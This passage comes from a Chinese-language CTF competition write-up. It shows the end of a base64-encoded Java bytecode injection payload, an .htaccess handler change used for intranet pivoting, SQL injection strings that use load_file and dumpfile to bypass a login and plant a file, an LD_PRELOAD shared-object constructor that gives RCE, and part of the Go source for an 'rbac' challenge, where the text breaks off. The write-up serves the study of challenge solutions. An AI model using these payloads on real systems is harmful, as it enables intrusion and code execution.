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&#39;;try{clsBase64=classLoader.loadClass(&#39;java.util.Base64&#39;);clsDecoder=classLoader.loadClass(&#39;java.util.Base64$Decoder&#39;);decoder=clsBase64.getMethod(&#39;getDecoder&#39;).invoke(base64Clz);bytecode=clsDecoder.getMethod(&#39;decode&#39;,clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass(&#39;javax.xml.bind.DatatypeConverter&#39;);bytecode=datatypeConverterClz.getMethod(&#39;parseBase64Binary&#39;,clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass(&#39;sun.misc.BASE64Decoder&#39;);bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass(&#39;java.lang.ClassLoader&#39;);clsByteArray=(&#39;&#39;.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod(&#39;defineClass&#39;,[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\&#34;)}&#34;</span><span class="p">,</span><span class="nt">&#34;dbSource&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;0&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>第一台里面有 MySQL, Redis 等</p>
+<h3 id="内网">内网</h3>
+<p>内网有台Windows Server起的apache, 存在FTP匿名用户访问, 可以上传下载文件
+可以改个<code>.htaccess</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">conf</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="conf"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">&lt;FilesMatch &#34;\.php$&#34;&gt;
+</span></span><span class="line"><span class="cl">    SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
+</span></span></code></pre></div></div><p>实际上这里不是 php解析, 是 cgi 解析, 具体 wp 可以看本站另一篇 <code>春秋云境 finance</code></p>
+<p>还有一台Ollama的CVE漏洞</p>
+<p>剩下的就没什么时间看了</p>
+<h3 id="hardphp">hardPHP</h3>
+<p>这道题挺有意思</p>
+<p>大概就是给了一个 SQL 注入的点, 但是要输入的 password 和数据库查出来的 password 保持一致</p>
+<p>所以利用 dumpfile和 load_file, 第一次注入把第二次查询的表达式写入到文件里, 第二次查询拿出来文件内容和表达式一致</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sql</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sql"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="s1">&#39;union/**/select/**/&#39;</span><span class="err">\</span><span class="s1">&#39;union/**/select/**/load_file(\&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">222</span><span class="err">\</span><span class="s1">&#39;)/**/union/**/select\&#39;&#39;/**/into/**/dumpfile/**/&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">222</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39;union/**/select/**/load_file(&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">222</span><span class="s1">&#39;)/**/union/**/select&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span></code></pre></div></div><p>之后在 <code>admin.php</code>里执行了<code>system(&quot;ls&quot;)</code>
+漏洞点是</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">php</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="php"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;env&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$key</span><span class="s2">=</span><span class="si">$value</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></div><p>当然里面有非常之多的过滤,除去那些看到这里差不多就知道了, 利用<code>LD_PRELOAD</code>注入环境变量, <code>LD_PRELOAD=/tmp/xxx</code></p>
+<p><code>/tmp/xxx</code>是我们恶意上传的 so 文件</p>
+<p>还记得我们之前如何登录的吗, 这个数据库允许 dumpfile, 那我们直接写 so 文件就好了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sql</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sql"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="s1">&#39;union/**/select/**/unhex(&#39;</span><span class="err">这里是你的</span><span class="w"> </span><span class="n">hex</span><span class="w"> </span><span class="err">编码后的数据</span><span class="s1">&#39;)/**/into/**/dumpfile/**/&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">xxx</span><span class="w">
+</span></span></span></code></pre></div></div><p>gcc 构建一下 so 文件
+<code>gcc -shared -fPIC -o preload.so preload.c</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">c</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="c"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">system</span><span class="p">(</span><span class="s">&#34;cat /f1ag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></div><p>最后成功 RCE</p>
+<h2 id="第二天">第二天</h2>
+<h3 id="rbac">rbac</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">go</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="go"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;errors&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;os&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;path/filepath&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;strings&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">RBACList</span> <span class="p">=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">int</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">ResTemplate</span> <span class="kd">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Success</span> <span class="kt">bool</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Data</span>    <span class="nx">any</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">ExecStruct</span> <span class="kd">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">File</span>      <span class="p">[]</span><span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Directory</span> <span class="p">[]</span><span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Pwd</span>       <span class="p">[]</span><span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Flag</span>      <span class="p">[]</span><span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">FuncName</span>  <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Param</span>     <span class="kt">string</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">r</span> <span class="o">:=</span> <span class="nx">gin</span><span class="p">.</span><span class="nf">Default</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">initRBAC</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">htmlContent</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;index.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s">&#34;Error loading HTML file&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nx">Writer</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="nx">htmlContent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/getCurrentRBAC&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">response</span> <span class="nx">ResTemplate</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:read&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">response</span> <span class="p">=</span> <span class="nx">ResTemplate</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Data</span><span class="p">:</span>    <span class="nx">RBACList</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">response</span> <span class="p">=</span> <span class="nx">ResTemplate</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">POST</span><span class="p">(</span><span class="s">&#34;/execSysFunc&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">execStruct</span> <span class="nx">ExecStruct</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">response</span> <span class="nx">ResTemplate</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">ShouldBindJSON</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">execStruct</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">response</span> <span class="p">=</span> <span class="nx">ResTemplate</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Data</span><span class="p">:</span>    <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;error&#34;</span><span class="p">:</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">()},</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// permission grant
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">RBACToGrant</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">int</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">value</span> <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">maxDeep</span> <span class="o">:=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">Directory</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">value</span> <span class="p">=</span> <span class="k">range</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">Directory</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="nx">maxDeep</span> <span class="p">&lt;</span> <span class="mi">8</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">RBACToGrant</span><span class="p">[</span><span class="s">&#34;directory:&#34;</span><span class="o">+</span><span class="nx">value</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">maxDeep</span><span class="o">++</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">Flag</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">value</span> <span class="p">=</span> <span class="k">range</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">Flag</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="nx">maxDeep</span> <span class="p">&lt;</span> <span class="mi">8</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">RBACToGrant</span><span class="p">[</span><span class="s">&#34;flag:&#34;</span><span class="o">+</span><span class="nx">value</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">maxDeep</span><span class="o">++</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">Pwd</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">value</span> <span class="p">=</span> <span class="k">range</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">Pwd</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="nx">maxDeep</span> <span class="p">&lt;</span> <span class="mi">8</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">RBACToGrant</span><span class="p">[</span><span class="s">&#34;pwd:&#34;</span><span class="o">+</span><span class="nx">value</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">maxDeep</span><span class="o">++</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">File</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">value</span> <span class="p">=</span> <span class="k">range</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">File</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="c1">// Grant temporary file:return permissions
